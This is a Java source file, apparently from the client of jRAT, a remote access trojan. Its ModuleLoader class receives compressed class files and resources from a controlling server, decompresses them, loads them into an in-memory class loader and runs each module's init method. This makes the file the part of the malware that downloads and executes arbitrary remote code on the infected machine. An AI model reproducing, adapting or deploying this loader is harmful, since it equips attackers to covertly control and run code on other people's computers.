package jrat.client.modules;

import jrat.api.ClientModule;
import jrat.client.Connection;
import jrat.client.Main;
import jrat.common.MemoryClassLoader;
import jrat.common.Logger;
import jrat.common.compress.QuickLZ;

public class ModuleLoader {

    /**
     * Read and load modules
     * @param c
     * @throws Exception
     */
    public static void read(Connection c) throws Exception {
        int len = c.readInt();

        for (int i = 0; i < len; i++) {
            // Main module class
            String mainClass = c.readLine();
            Main.debug("receiving module " + mainClass);

            MemoryClassLoader l = new MemoryClassLoader(ModuleLoader.class.getClassLoader(), null);

            // read all classes and resources from the server
            while (c.readBoolean()) {
                boolean clazz = c.readBoolean();
                String name = c.readLine();

                int classLen = c.readInt();
                byte[] buffer = new byte[classLen];
                c.getDataInputStream().readFully(buffer);

                buffer = QuickLZ.decompress(buffer);

                if (clazz) {
                    l.addClass(name, buffer);
                } else {
                    l.addResource(name, buffer);
                }

                Main.debug("\tclass " + name + " (" + classLen + " b)");
            }

            // load the main class
            Class<ClientModule> clazz = (Class<ClientModule>) l.loadClass(mainClass);

            ClientModule module = clazz.newInstance();

            try {
                module.init();
            } catch (Exception ex) {
                Logger.warn("module " + mainClass + " failed to load");
                ex.printStackTrace();
            }
        }
    }
}
